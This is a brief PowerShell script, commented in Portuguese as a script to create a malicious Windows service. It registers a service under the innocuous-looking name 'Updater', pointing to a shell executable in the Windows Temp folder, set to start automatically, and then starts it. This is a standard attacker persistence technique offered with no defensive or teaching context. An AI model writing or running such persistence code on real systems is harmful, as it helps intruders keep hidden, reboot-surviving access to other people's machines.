# Script PowerShell para criar serviço malicioso no Windows

$serviceName = "Updater"
$binaryPath = "C:\Windows\Temp\shell.exe"

New-Service -Name $serviceName -BinaryPathName $binaryPath -StartupType Automatic
Start-Service -Name $serviceName
